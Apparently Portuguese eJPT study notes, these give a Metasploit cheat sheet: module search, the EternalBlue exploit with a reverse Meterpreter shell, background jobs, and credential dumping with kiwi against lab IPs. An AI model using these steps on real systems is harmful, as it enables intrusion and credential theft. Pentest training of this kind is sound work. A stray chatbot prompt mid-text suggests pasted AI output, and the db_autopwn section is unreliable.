#+title: Vulnerability Scanning With Msf
#+author:Gabriel

#+TITLE: ðŸ›°ï¸ METASPLOIT FUNDAMENTALS (eJPT BOOTCAMP)
#+AUTHOR: Gabriel
#+CATEGORY: Beginner_Tactical

* ðŸš¦ STAGE 01: THE CONSOLE ENVIRONMENT
Antes de atacar, prepare o terreno. No eJPT, vocÃª mudarÃ¡ de alvo constantemente, entÃ£o o gerenciamento de variÃ¡veis Ã© vital.

#+begin_src msf
  |â”€â”€ ðŸ“‚ INITIALIZATION
  â”‚   msf6 > help                # O melhor amigo; use 'help <comando>' para detalhes
  â”‚   msf6 > version             # Garante que as assinaturas estÃ£o atualizadas
  â”‚
  |â”€â”€ ðŸŽ¯ TARGETING (The 'set' vs 'setg' logic)
  â”‚   # Use 'setg' para nÃ£o ter que repetir o IP em cada mÃ³dulo diferente
  â”‚   msf6 > setg RHOSTS 10.10.10.15
  â”‚   msf6 > setg LHOST tun0     # Seta sua interface da VPN automaticamente
  â”‚
  |â”€â”€ ðŸ” SEARCHING FOR WEAPONS
  â”‚   msf6 > search type:exploit platform:windows smb
  â”‚   msf6 > search eternalblue  # Busca direta por nome comum
#+end_src

* ðŸ› ï¸ STAGE 02: MODULE SELECTION & ANATOMY
Todo mÃ³dulo no Metasploit segue o mesmo fluxo lÃ³gico. Aprenda o padrÃ£o e vocÃª dominarÃ¡ qualquer exploit novo.

#+begin_src msf
  |â”€â”€ âš™ï¸ LOADING A MODULE
  â”‚   msf6 > use exploit/windows/smb/ms17_010_psexec
  â”‚
  |â”€â”€ ðŸ“‹ INSPECTION
  â”‚   msf6 > info                # LÃª o que o exploit faz e as CVEs relacionadas
  â”‚   msf6 > show options        # O que eu PRECISO preencher? (Required: yes)
  â”‚   msf6 > show targets        # O exploit serve para qual versÃ£o de Windows/Linux?
  â”‚
  |â”€â”€ ðŸ§ª PRE-FLIGHT CHECK (Crucial no eJPT!)
  â”‚   msf6 > check               # Verifica se o alvo Ã© vulnerÃ¡vel SEM disparar o exploit
#+end_src

* ðŸ“¡ STAGE 03: PAYLOADS & HANDLERS
O payload Ã© o que acontece *depois* que vocÃª entra. No eJPT, o **Meterpreter** Ã© sua ferramenta principal de coleta de dados.

** ðŸ§¬ Common Payload Types
- **Bind Shell:** O alvo abre uma porta e vocÃª se conecta. (Bom se nÃ£o houver Firewall).
- **Reverse Shell:** O alvo se conecta de volta em vocÃª. (PadrÃ£o para bypass de Firewall).

#+begin_src msf
  # Selecionando o payload (Geralmente o MSF escolhe um padrÃ£o, mas Ã© bom saber mudar)
  msf6 > show payloads
  msf6 > set payload windows/x64/meterpreter/reverse_tcp
  
  # ExecuÃ§Ã£o
  msf6 > exploit                 # Ou 'run'
  msf6 > exploit -j              # Roda em segundo plano (Job)
#+end_src

* ðŸ•¹ï¸ STAGE 04: BASIC INTERACTION
Uma vez dentro, vocÃª precisa saber sair do "modo exploit" e entrar no "modo comando".

#+begin_src msf
  |â”€â”€ ðŸšª SESSION MANAGEMENT
  â”‚   msf6 > sessions -l         # Lista todas as mÃ¡quinas que vocÃª dominou
  â”‚   msf6 > sessions -i 1       # Interage com a sessÃ£o ID 1
  â”‚   ctrl+z                     # Background: sai da shell mas mantÃ©m a conexÃ£o viva
  â”‚
  |â”€â”€ ðŸš BASIC SHELL UPGRADE
  â”‚   # Se pegou uma shell comum, tente dar upgrade para Meterpreter
  â”‚   msf6 > sessions -u 1       
#+end_src

* ðŸ§® CHEAT SHEET: COMMAND SUMMARY
| Unicode | Comando         | DescriÃ§Ã£o                                   |
|---------+-----------------+---------------------------------------------|
| ðŸ”¦      | ~back~          | Sai do mÃ³dulo atual para o menu principal   |
| ðŸ“      | ~edit~          | Abre o cÃ³digo do exploit no Vim/Nano        |
| ðŸ”„      | ~reload~        | Recarrega o mÃ³dulo se vocÃª o editou         |
| â¹ï¸      | ~jobs -K~       | Mata todos os processos em background       |

---
ðŸ’¡ **Dica de Fluxo**: No eJPT, se vocÃª encontrar um serviÃ§o (ex: FTP) e nÃ£o souber a versÃ£o, use os mÃ³dulos ~auxiliary/scanner/...~ primeiro. Eles sÃ£o mais "barulhentos" que o Nmap, mas trazem informaÃ§Ãµes muito especÃ­ficas para o Metasploit.

Deseja que eu detalhe algum mÃ³dulo de **EnumeraÃ§Ã£o** especÃ­fico (como HTTP ou SMB) que cai bastante no exame?

* ðŸŒŒ PHASE 01: DATABASE ORCHESTRATION
A base de dados Ã© onde a inteligÃªncia do pentest reside. Sem ela, vocÃª estÃ¡ apenas "chutando" exploits.

#+begin_src msf
  |â”€â”€ ðŸ“‚ WORKSPACE MANAGEMENT
  â”‚   msf6 > workspace -a internal_corp_lab  # Cria o container do projeto
  â”‚   msf6 > workspace -l                    # Lista todos os projetos ativos
  â”‚
  |â”€â”€ ðŸ“¥ DATA INGESTION (SILENT & AGGRESSIVE)
  â”‚   # db_nmap salva o output diretamente na estrutura do PostgreSQL
  â”‚   msf6 > db_nmap -sV -Pn -T4 --open --script=banner <NETWORK/24>
  â”‚
  |â”€â”€ ðŸ“Š TARGET ANALYSIS
  â”‚   msf6 > hosts -c address,os_name,purpose  # VisualizaÃ§Ã£o limpa dos alvos
  â”‚   msf6 > services -u -p 80,443,445        # Filtra portas crÃ­ticas ativas
#+end_src

* ðŸŽ¯ PHASE 02: VULNERABILITY CORRELATION
Aqui Ã© onde o software engineering encontra o hacking: correlacionar versÃµes com cÃ³digos de falha.

** âš¡ The Autopwn Logic
#+begin_src msf
  # O db_autopwn analisa o DB e sugere/ataca com base nos 'services'
  msf6 > load db_autopwn
  msf6 > db_autopwn -p -t -e  # [P]ort matching | [T]able show | [E]xecute
#+end_src

** ðŸ§ª Manual Precision (Auxiliary Selection)
Se o autopwn falhar, use mÃ³dulos de "Scanning & Discovery" para confirmar vulnerabilidades:

| Service | Module Path                                     | Objective               |
|---------+-------------------------------------------------+-------------------------|
| ðŸ–¥ï¸ SMB  | auxiliary/scanner/smb/smb_ms17_010              | Check EternalBlue       |
| ðŸŒ HTTP | auxiliary/scanner/http/http_put                 | Test File Upload        |
| ðŸ“¦ SSH  | auxiliary/scanner/ssh/ssh_enumusers              | User Enumeration        |
| ðŸ—„ï¸ SQL  | auxiliary/admin/mssql/mssql_enum                 | Database Discovery      |

* ðŸ’€ PHASE 03: EXPLOITATION & PERSISTENCE
ConfiguraÃ§Ã£o de variÃ¡veis globais para pivotagem e ataque em massa.

#+begin_src msf
  # ðŸŒ GLOBAL SCOPE (setg)
  # Uma vez definido, todos os mÃ³dulos herdarÃ£o esses valores
  msf6 > setg RHOSTS 192.168.1.100
  msf6 > setg LHOST tun0
  msf6 > setg LPORT 4444
  msf6 > setg ExitOnSession false    # MantÃ©m o handler aberto para mÃºltiplos hits
  
  # ðŸš€ EXECUTION
  msf6 > use exploit/windows/smb/ms17_010_psexec
  msf6 > check                       # SEMPRE use o check antes de disparar
  msf6 > run -j                      # Executa como um Job em background
#+end_src

* ðŸ“‘ PHASE 04: POST-EXPLOITATION (METERPRETER)
Comandos essenciais para coletar evidÃªncias para o report final do eJPT.

#+begin_src msf
  meterpreter > getprivs             # Verifica tokens de privilÃ©gio
  meterpreter > load kiwi            # Carrega o Mimikatz moderno
  meterpreter > creds_all            # Tenta despejar todas as credenciais em memÃ³ria
  meterpreter > run post/windows/gather/checkvm  # Detecta se Ã© Sandbox/Lab
#+end_src

